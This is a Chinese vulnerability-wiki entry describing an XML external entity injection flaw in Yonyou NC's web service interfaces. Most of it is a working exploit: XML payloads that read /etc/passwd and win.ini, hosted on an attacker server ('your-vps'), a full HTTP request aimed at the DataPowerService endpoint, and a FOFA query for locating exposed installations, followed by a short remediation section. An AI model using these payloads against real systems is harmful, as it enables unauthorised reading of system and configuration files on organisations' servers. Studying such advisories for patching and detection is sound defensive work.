---
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 关于用友 NC XML实体注入漏洞预警

# 漏洞描述

用友 NC 多处接口存在XML实体注入漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 影响范围

用友 NC

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

python起http服务建立对应系统的xml

http://your-vps:8000/linux.xml

windows:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]><user><username>&name;</username><password>1</password></user>

linux:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]><user><username>&name;</username><password>1</password></user>


FOFA：app="用友-UFIDA-NC"

POC/EXP：

GET /uapws/service/**nc.itf.ses.DataPowerService**?xsd=http://your-vps:8000/linux.xml HTTP/1.1
Host: 121.0.0.1:55555
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=00005jPasWztH6Dks3U51sM0pFy:1h2s67gf4
Connection: close


POC/EXP中加粗部分可替换 漏洞接口.txt 中其他接口


# 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
